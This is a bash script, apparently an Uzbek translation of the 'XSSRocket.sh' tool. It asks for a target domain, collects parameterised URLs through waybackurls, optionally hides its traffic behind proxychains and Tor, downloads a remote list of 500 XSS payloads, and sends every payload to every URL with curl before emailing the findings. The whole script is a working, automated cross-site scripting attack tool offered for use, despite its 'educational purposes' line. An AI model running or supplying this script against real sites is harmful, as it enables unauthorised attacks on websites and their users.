#!/bin/bash
# Tashqi manbadan ASCII art ni ko'rsatish
curl --silent "https://raw.githubusercontent.com/blackhatethicalhacking/Subdomain_Bruteforce_bheh/main/ascii.sh" | lolcat
echo ""

# Hujumga qarshi xavfsizlik uchun tasodifiy Sun Tzu iqtibosini yaratish
quotes=("Jang san'atining eng yuqori shu - dushmanid janglamay bo'yni eshitish." "Barcha jang aldash asosida." "Kim qachon jang qilishi va qachon jang qila olmasligini bilsa, g'alaba qozonadi." "Butun tinchlik va farovonlik tizimi bu asosan strategik o'ylashga asoslanadi." "Yuqori darajadagi komandor ko'rishdan to'rtaladi." "Dushman bo'lmasa, o'zingiz dushman bo'lishingiz mumkin.")
random_quote=${quotes[$RANDOM % ${#quotes[@]}]}
echo "Hujumga qarshi xavfsizlik maslahat: $random_quote - Sun Tzu" | lolcat

echo "Muhim Eslatma: Agar siz SMTP konfiguratsiyasini o'zgartirmasa va o'zingizning hisobingizni yaratmasa, natijalarni ko'ra olmaysiz. Siz mailtrap.io dan bepul foydalanishingiz va bu vositaning manba kodini tahrirlab o'zingizning ma'lumotlarini qo'shishingiz mumkin."

# Iqtibosni chop qilish
echo "Hujumga qarshi xavfsizlik maslahat: $random_quote - Sun Tzu" | lolcat
sleep 1
figlet "KHUSUMATNI BOSIB OLIB OL!" | lolcat
sleep 1
echo "BU DEGANI, BU ☕ 1337 ⚡ VAQTI, 369 ☯ " | lolcat
sleep 1
echo "[SIZ XSSRocket.sh ISHLATAYAPSI] - (v2.0) Chris 'SaintDruG' Abou-Chabké tomonidan ❤ bilan blackhatethicalhacking.com uchun faqat o'quv maqsadlari uchun KODLANGAN!" | lolcat
sleep 1

# Foydalanuvchi natijalarni emailga olish istayotganini so'rash
echo "Natijalarni emailga olishni istaysizmi? (y/n): " | lolcat
read send_email

# Agar foydalanuvchi email istasa, email manzilni so'rash
if [[ "$send_email" == "y" ]]; then
echo "Natijalarni olish uchun email manzilingizni kiriting: " | lolcat
read user_email
fi

# lolcat, fortune-mod, figlet va curl ni o'rnatish ni tekshirish
dependencies=("lolcat" "fortune" "figlet" "curl")
for dep in "${dependencies[@]}"; do
if ! command -v "$dep" > /dev/null; then
echo "$dep topilmadi, o'rnatilmoqda..." | lolcat
if command -v dnf > /dev/null; then
sudo dnf install -y "$dep"
elif command -v yum > /dev/null; then
sudo yum install -y "$dep"
elif command -v apt-get > /dev/null; then
sudo apt-get install -y "$dep"
else
echo "Xato: paket menejeri topilmadi, iltimos $dep ni qo'l bilan o'rnating"
exit 1
fi
fi
done

# Foydalanuvchi Internetga ulanganligini tekshirish
echo "INTERNETGA ULANGANLIGINGIZNI TEKSHIRILMOQDA!" | lolcat
wget -q --spider https://google.com
if [ $? -ne 0 ]; then
echo "++++ XSSRocket.sh ni ishlatishdan oldin INTERNETGA ULAning!" | lolcat
exit 1
fi
echo "++++ ULANISH TOPILDI, DAVOM ETAMIZ!" | lolcat

# Foydalanuvchiga domenni kiritishni so'rash
echo "Hujum qilmoqchi bo'lgan domenni kiriting: " | lolcat
read domain

# Foydalanuvchiga shirinlik hujumini bajarish istayotganini so'rash
echo "Shirinlik hujumini bajarishni istaysizmi? (y/n)" | lolcat
read stealth_attack

# Shirinlik hujumi tanlangan bo'lsa proxychains dan foydalanish
if [[ $stealth_attack == "y" ]]; then
echo "Proxychains tekshirilmoqda va o'rnatilmoqda..." | lolcat
if ! command -v proxychains4 > /dev/null; then
echo "proxychains4 o'rnatilmoqda..." | lolcat
sudo apt-get install -y proxychains4 torsocks
torsocks
fi
echo "Proxychains o'rnatildi, shirinlik hujumi davom ettirilmoqda..." | lolcat
proxychains4 waybackurls $domain | grep -E '\?[a-zA-Z0-9]+=' > param_urls.txt
else
echo "Shirinlik olmasa davom ettirilmoqda..." | lolcat
waybackurls $domain | grep -E '\?[a-zA-Z0-9]+=' > param_urls.txt
fi

# GitHub dan masofadan XSS payload ro'yxatini foydalanish
payload_file="xss-payload-list.txt"
payload_url="https://raw.githubusercontent.com/blackhatethicalhacking/XSSRocket/main/top-500-xss-payloads.txt"
if test ! -f "$payload_file"; then
echo "Payload ro'yxati yuklanimoqda: $payload_url" | lolcat
wget $payload_url -O $payload_file
fi

# pv (progress bar utilities) ni o'rnatish
if ! command -v pv > /dev/null; then
sudo apt-get install -y pv
fi

# Hujumni boshlash
echo "Hujum boshlanmoqda:" | lolcat
counter=0
while read payload; do
for url in $(cat param_urls.txt | sed 's/\([^=&?]*\)=.*/\1=/g'); do
echo "Payload yuborilmoqda $payload to $url"
random_delay=$(awk 'BEGIN{srand();print int(rand()*2)}')
sleep $random_delay
response=$(curl -s -G "$url$payload" -w "%{http_code}")
status_code=${response: -3}
if echo "$response" | grep -q "payload_marker"; then
echo "XSS zaifligiga uchrashdi! $url" | lolcat
echo $url >> affected_urls.txt
counter=$((counter+1))
triggered_payload="$payload"
fi
[[ $status_code == "200" ]] && echo -e "\033[0;32m$status_code\033[0m" || echo -e "\033[0;31m$status_code\033[0m"
echo "$url$payload"
echo -n "." | pv -qL 10
done
done < <(pv -N "XSS Payloadlari" xss-payload-list.txt)

# Email yoki terminal chiqarishi uchun xulosa tayyorlash
summary=""
if [ -s affected_urls.txt ]; then
summary="Jami $(cat affected_urls.txt | wc -l) ta mumkin bo'lgan XSS injectionlari topildi.\nMumkin bo'lgan ranjavur URL lar:\n$(cat affected_urls.txt)"
else
summary="Skan paytida zaifliklar topilmadi."
fi

# Papkada natijalarni saqlash
clean_domain=`echo $domain | tr -cd '[:alnum:]\n\r'`
mkdir $clean_domain
mv param_urls.txt affected_urls.txt $clean_domain/
echo "Natijalar $clean_domain da saqlandi" | lolcat

# Agar foydalanuvchi emailni tanlasa, natijalarni email orqali yuborish
if [[ "$send_email" == "y" ]]; then
echo "Natijalar $user_email ga email orqali yuborilmoqda..." | lolcat
recipient="$user_email"
subject="XSS Skan Natijalari $domain uchun"
body="Bu $domain uchun XSS skan xulosasidir:\n\n$summary"
smtp_url="smtp.mailtrap.io"
smtp_port="2525"
username="SMTP foydalanuvchi nomingizni qo'shing"
password="SMTP parolingizni qo'shing"

curl --url "smtp://$smtp_url:$smtp_port" \
--ssl-reqd \
--mail-from "SMTPingizni qo'shing@email.com" \
--mail-rcpt "$recipient" \
--upload-file <(echo -e "From: XSSRocket <SMTP@email.com>\nTo: $recipient\nSubject: $subject\n\n$body") \
--user "$username:$password"

echo -e "\nEmail yuborildi!" | lolcat
else
# Agar foydalanuvchi email istamasa, terminalde xulosalapishini ko'rsatish
echo "Natijalar Xulosalanishi:" | lolcat
echo -e "$summary" | lolcat
fi

# Yakuniy xabar
echo "XSSRocket.sh ishlatganingiz uchun rahmat!" | lolcat
